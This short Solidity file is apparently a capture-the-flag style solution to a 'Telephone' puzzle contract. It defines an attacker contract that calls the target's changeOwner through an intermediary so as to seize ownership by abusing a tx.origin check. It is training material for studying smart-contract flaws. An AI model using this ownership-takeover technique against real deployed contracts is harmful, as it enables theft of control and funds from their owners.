// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Telephone} from "../../puzzles/4/Telephone.sol";

contract TelephoneAttacker {
    Telephone public immutable telephone;

    constructor(address telephoneAddress){
        telephone = Telephone(telephoneAddress);
    }

    function attack() external {
        telephone.changeOwner(msg.sender);
    }
}
